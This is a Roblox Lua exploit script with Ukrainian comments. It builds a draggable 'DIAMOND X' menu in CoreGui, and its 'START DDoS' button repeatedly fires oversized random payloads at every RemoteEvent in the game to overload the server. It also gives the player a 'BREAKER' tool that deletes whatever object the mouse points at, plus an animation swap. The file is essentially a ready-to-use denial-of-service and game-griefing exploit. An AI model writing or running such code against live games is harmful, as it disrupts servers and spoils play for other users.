-- [[ DIAMOND X | AIDEL - FINAL STABLE ]]
local coreGui = game:GetService("CoreGui")
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local userInputService = game:GetService("UserInputService")

if coreGui:FindFirstChild("DiamondX_Final") then coreGui.DiamondX_Final:Destroy() end

local screenGui = Instance.new("ScreenGui", coreGui)
screenGui.Name = "DiamondX_Final"

local main = Instance.new("Frame", screenGui)
main.Size = UDim2.new(0, 220, 0, 280)
main.Position = UDim2.new(0.5, -110, 0.4, 0)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
main.BorderSizePixel = 2
main.BorderColor3 = Color3.fromRGB(255, 0, 0) -- Червона рамка для агресивного вигляду
main.Active = true
main.Draggable = true

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "DIAMOND X CORE"
title.TextColor3 = Color3.new(1, 0, 0)
title.Font = Enum.Font.GothamBold
title.BackgroundTransparency = 1

-- === ЛОГІКА АТАКИ (BYPASS 268) ===
_G.stressing = false
local function runAttack()
    local payload = {}
    for i = 1, 300 do payload[i] = string.rep(tostring(math.random()), 50) end
    
    runService.Heartbeat:Connect(function()
        if _G.stressing then
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    pcall(function() v:FireServer(payload) end)
                end
            end
            task.wait(0.5) -- Твій ліміт: 2 рази на секунду
        end
    end)
end

-- === СТВОРЕННЯ КНОПОК (БЕЗ СКРОЛУ, ЩОБ ВСЕ БУЛО ВИДНО) ===
local function createBtn(txt, pos, color, func)
    local b = Instance.new("TextButton", main)
    b.Size = UDim2.new(0.9, 0, 0, 45)
    b.Position = pos
    b.Text = txt
    b.BackgroundColor3 = color
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(func)
end

-- 1. Кнопка Атаки (Тепер точно буде!)
createBtn("START DDoS (2/sec)", UDim2.new(0.05, 0, 0.2, 0), Color3.fromRGB(200, 0, 0), function()
    _G.stressing = not _G.stressing
    warn("[aidel]: Attack -> " .. tostring(_G.stressing))
    if _G.stressing then runAttack() end
end)

-- 2. Кнопка Анімацій
createBtn("COOLKID ANIMS", UDim2.new(0.05, 0, 0.4, 0), Color3.fromRGB(40, 40, 40), function()
    local char = players.LocalPlayer.Character
    if char and char:FindFirstChild("Animate") then
        char.Animate.walk.WalkAnim.AnimationId = "rbxassetid://180426354"
        char.Animate.idle.Animation1.AnimationId = "rbxassetid://180435571"
    end
end)

-- 3. Кнопка Breaker
createBtn("GET BREAKER", UDim2.new(0.05, 0, 0.6, 0), Color3.fromRGB(0, 120, 200), function()
    local tool = Instance.new("Tool", players.LocalPlayer.Backpack)
    tool.Name = "💎 BREAKER"; tool.RequiresHandle = false
    tool.Activated:Connect(function()
        local m = players.LocalPlayer:GetMouse()
        if m.Target then m.Target:Destroy() end
    end)
end)

-- Сховати на RightControl
userInputService.InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.RightControl then main.Visible = not main.Visible end
end)
